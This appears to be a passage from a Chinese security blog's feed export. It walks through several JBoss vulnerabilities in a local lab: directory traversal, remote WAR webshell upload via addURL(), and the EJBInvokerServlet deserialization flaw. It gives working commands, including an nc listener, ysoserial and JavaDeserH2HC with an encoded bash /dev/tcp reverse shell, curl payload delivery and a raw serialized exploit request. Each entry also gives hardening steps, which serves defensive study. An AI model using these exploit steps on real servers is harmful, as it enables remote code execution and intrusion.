<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p><strong>访问如下URL</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin:service=DeploymentFileRepository</span><br></pre></td></tr></table></figure>

<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gu37mkia7wj60qa083dko02.jpg" alt="JBoss DeploymentFileRepository目录遍历漏洞.png"></p>
<p>这里<code>BaseDir</code>没有对输入的路径做检查</p>
<p>我们可以设置任意路径</p>
<p>并且通过该类下的<code>store()</code>和<code>remove()</code>方法创建和删除文件</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gu37wd5476j60lh0im10302.jpg" alt="JBoss DeploymentFileRepository目录遍历漏洞1.png"></p>
<p>可以通过此方法创建或者覆盖<code>jsp</code>后端语言的文件并执行</p>
<p>可以获取目标系统<code>getshell</code>或者执行任意代码</p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>将JBoss后台添加权限，控制访问者对敏感路径访问</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\jboss-web.xml</span><br><span class="line">＃　删除下列代码的注释,添加账号密码访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-domain</span>&gt;</span>java:/jaas/jmx-console<span class="tag">&lt;/<span class="name">security-domain</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\web.xml</span><br><span class="line">＃　删除下列代码的注释，只有拥有系统配置的登录角色JBossAdmin的用户才能访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HtmlAdaptor<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the role JBossAdmin to access the HTML JMX console web application</span><br><span class="line">		<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">role-name</span>&gt;</span>JBossAdmin<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 这里修改账号密码</span><br><span class="line">jboss\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">#　这里修改账号权限</span><br><span class="line">jboss\server\default\conf\props\jmx-console-roles.properties</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>更新到 JBoss 5.1.0 或者6.0.0以上</li>
<li>若不使用控制平台管理，删除<code>jmx-console.war</code>和<code>web-console.war</code>，在以下路径</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\all\deploy\jmx-console.war</span><br><span class="line">jboss\server\default\deploy\jmx-console.war</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>JBoss</category>
        <category>目录遍历漏洞</category>
      </categories>
      <tags>
        <tag>目录遍历漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss DeploymentScanner.addURL()文件上传漏洞</title>
    <url>//3f4628f47a28.html</url>
    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        此漏洞主要是由于JBoss中<code>/jmx-console/HtmlAdaptor</code>路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。该漏洞利用的是后台中<code>jboss.deployment -&gt; DeploymentScanner -&gt; addURL()</code>方法，传入带有war包的HTTP地址，当服务器访问时便会上传shell。</p>
<p>但是，上传shell的文件只是一个映射文件，</p>
<p>当url一旦无法访问或者内部资源丢失，则服务器上的文件也会相应消失。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：JBoss 4.x以下</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 8以下</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p><strong>访问如下URL</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.deployment:type=DeploymentScanner,flavor=URL</span><br></pre></td></tr></table></figure>

<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gu2c37ac55j60og07ejt802.jpg" alt="JBoss文件上传addURL().png"></p>
<p>输入带有war包的HTTP地址</p>
<p><code>http://xxx.com/shell.war</code></p>
<p>最后点击<code>Invoke</code>上传</p>
<p>上传的路径为<code>JBos/server/default/deploy/management/shell.war/shell.jsp</code></p>
<p>访问以下URL链接shell</p>
<p><code>http://127.0.0.1:8080/shell/shell.jsp</code></p>
<p><strong>制作WAR包</strong></p>
<div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">使用Java生成</button></li><li class="tab"><button type="button" data-href="#-2">直接打包shell</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jar cvf shell.war shell.jsp</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">压缩shell.jsp成shell.zip,然后shell.zip改名为shell.war</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>将JBoss后台添加权限，控制访问者对敏感路径访问</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\jboss-web.xml</span><br><span class="line">＃　删除下列代码的注释,添加账号密码访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-domain</span>&gt;</span>java:/jaas/jmx-console<span class="tag">&lt;/<span class="name">security-domain</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\web.xml</span><br><span class="line">＃　删除下列代码的注释，只有拥有系统配置的登录角色JBossAdmin的用户才能访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HtmlAdaptor<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the role JBossAdmin to access the HTML JMX console web application</span><br><span class="line">		<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">role-name</span>&gt;</span>JBossAdmin<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 这里修改账号密码</span><br><span class="line">jboss\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">#　这里修改账号权限</span><br><span class="line">jboss\server\default\conf\props\jmx-console-roles.properties</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>更新到 JBoss 5.1.0 或者6.0.0以上</li>
<li>若不使用控制平台管理，删除<code>jmx-console.war</code>和<code>web-console.war</code>，在以下路径</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\all\deploy\jmx-console.war</span><br><span class="line">jboss\server\default\deploy\jmx-console.war</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>文件上传漏洞</category>
        <category>JBoss</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss EJBInvokerServlet 反序列化漏洞 - CVE-2013-4810</title>
    <url>//5ced298ab0a9.html</url>
    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>由于<code>JBoss</code>中<code>invoker/EJBInvokerServlet</code>路径对外开放，</p>
<p><code>EJBInvokerServlet</code> 利用的是 <code>org.jboss.invocation.MarshalledValue</code> 进行的反序列化操作</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
<p>&gt;= JBoss 6.x</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p>访问如下地址</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/invoker/EJBInvokerServlet</span><br></pre></td></tr></table></figure>

<p>如果提示下载信息，则说明存在此漏洞</p>
<p>监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>

<p>下载JavaDeserH2HC工具</p>
<p><a href="https://github.com/joaomatosf/JavaDeserH2HC">https://github.com/joaomatosf/JavaDeserH2HC</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/EJBInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span></span><br></pre></td></tr></table></figure>

<p>也可以使用<code>ysoserial.jar</code>工具</p>
<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
<p>这里命令是<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1</code>，需要先进行编码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java  -jar  ysoserial.jar  CommonsCollections1 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; jboss.ser</span><br><span class="line">    </span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/EJBInvokerServlet --data-binary @jboss.ser -x http://127.0.0.1:1080</span></span><br><span class="line">-x 是设置代理</span><br></pre></td></tr></table></figure>

<p>HTTP头部抓包</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/invoker/EJBInvokerServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1630</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Expect</span><span class="punctuation">: </span>100-continue</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="xquery"><span class="meta">%ac</span><span class="meta">%ed</span>=&amp;sr=&amp;<span class="number">2</span>sun.reflect.annotation.AnnotationInvocationHandlerU<span class="meta">%ca</span><span class="meta">%f5</span>=&amp;<span class="meta">%cb</span><span class="meta">%7e</span><span class="meta">%a5</span>=&amp;L=&amp;memberValuest=&amp;Ljava<span class="meta">%2futil</span><span class="meta">%2fMap</span><span class="meta">%3bL</span>=&amp;typet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxps</span><span class="meta">%7d</span>=&amp;java.util.Mapxr=&amp;java<span class="built_in">.lang</span>.reflect.Proxy<span class="meta">%e1</span><span class="meta">%27</span><span class="meta">%da</span>+<span class="meta">%cc</span>=&amp;C<span class="meta">%cb</span>=&amp;L=&amp;ht=&amp;<span class="meta">%25Ljava</span><span class="meta">%2flang</span><span class="meta">%2freflect</span><span class="meta">%2fInvocationHandler</span><span class="meta">%3bxpsq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;*org.apache.commons.collections.<span class="keyword">map</span>.LazyMapn<span class="meta">%e5</span><span class="meta">%94</span><span class="meta">%82</span><span class="meta">%9ey</span>=&amp;<span class="meta">%94</span>=&amp;L=&amp;factoryt=&amp;<span class="meta">%2cLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpsr</span>=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.ChainedTransformer<span class="number">0</span><span class="meta">%c7</span><span class="meta">%97</span><span class="meta">%ec</span><span class="meta">%28z</span><span class="meta">%97</span>=&amp;<span class="meta">%5b</span>=&amp;iTransformerst=&amp;-<span class="meta">%5bLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpur</span>=&amp;-<span class="meta">%5bLorg</span>.apache.commons.collections.Transformer<span class="meta">%3b</span><span class="meta">%bdV</span>*<span class="meta">%f1</span><span class="meta">%d84</span>=&amp;<span class="meta">%99</span>=&amp;xp=&amp;sr=&amp;<span class="meta">%3borg</span>.apache.commons.collections.functors.ConstantTransformerXv<span class="meta">%90</span>=&amp;A=&amp;<span class="meta">%b1</span><span class="meta">%94</span>=&amp;L=&amp;iConstantt=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bxpvr</span>=&amp;java<span class="built_in">.lang</span>.Runtime=&amp;xpsr=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.InvokerTransformer<span class="meta">%87</span><span class="meta">%e8</span><span class="meta">%ffk</span><span class="meta">%7b</span><span class="meta">%7c</span><span class="meta">%ce8</span>=&amp;<span class="meta">%5b</span>=&amp;iArgst=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bL</span>=&amp;iMethodNamet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fString</span><span class="meta">%3b</span><span class="meta">%5b</span>=&amp;iParamTypest=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxpur</span>=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Object<span class="meta">%3b</span><span class="meta">%90</span><span class="meta">%ceX</span><span class="meta">%9f</span>=&amp;s<span class="meta">%29l</span>=&amp;xp=&amp;t=&amp;getRuntimeur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Class<span class="meta">%3b</span><span class="meta">%ab</span>=&amp;<span class="meta">%d7</span><span class="meta">%ae</span><span class="meta">%cb</span><span class="meta">%cdZ</span><span class="meta">%99</span>=&amp;xp=&amp;t=&amp;getMethoduq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.String<span class="meta">%a0</span><span class="meta">%f0</span><span class="meta">%a48z</span><span class="meta">%3b</span><span class="meta">%b3B</span>=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;uq=&amp;<span class="meta">%7e</span>=&amp;puq=&amp;<span class="meta">%7e</span>=&amp;t=&amp;invokeuq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.Object=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;ur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.String<span class="meta">%3b</span><span class="meta">%ad</span><span class="meta">%d2V</span><span class="meta">%e7</span><span class="meta">%e9</span>=&amp;<span class="meta">%7bG</span>=&amp;xp=&amp;t=&amp;&#123;这里为输入命令&#125;&amp;execuq=&amp;<span class="meta">%7e</span>=&amp;q=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%23sq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;java<span class="built_in">.lang</span>.Integer=&amp;<span class="meta">%e2</span><span class="meta">%a0</span><span class="meta">%a4</span><span class="meta">%f7</span><span class="meta">%81</span><span class="meta">%878</span>=&amp;I=&amp;valuexr=&amp;java<span class="built_in">.lang</span>.Number<span class="meta">%86</span><span class="meta">%ac</span><span class="meta">%95</span>=&amp;<span class="meta">%94</span><span class="meta">%e0</span><span class="meta">%8b</span>=&amp;xp=&amp;sr=&amp;java.util.HashMap=&amp;<span class="meta">%da</span><span class="meta">%c1</span><span class="meta">%c3</span>=&amp;<span class="meta">%60</span><span class="meta">%d1</span>=&amp;F=&amp;loadFactorI=&amp;thresholdxp<span class="meta">%3f</span>@=&amp;w=&amp;xxvr=&amp;java<span class="built_in">.lang</span>.Override=&amp;xpq=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%3a</span>=</span></span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li><p>删除<code>http-invoker.sar</code>组件</p>
</li>
<li><p>设置<code>http-invoker</code></p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\http-invoker.sar\invoker.war\WEB-INF\web.xml</span><br><span class="line"></span><br><span class="line">在security-constraint 标签中添加以下代码</span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>升级JBoss版本</p>
</li>
</ol>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>JBoss</category>
        <category>反序列化漏洞</category>
      </categories>
      <tags>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss JMX Console未授权访问漏洞</title>
    <url>//8e92a3ee39a7.html</url>
    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​    此漏洞主要是由于JBoss中<code>/jmx-console/HtmlAdaptor</code>路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。</p>
<p>由于 JBoss Web Server 缺少默认身份验证强制执行，因此也可以完全控制应用程序。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
<p>全版本</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
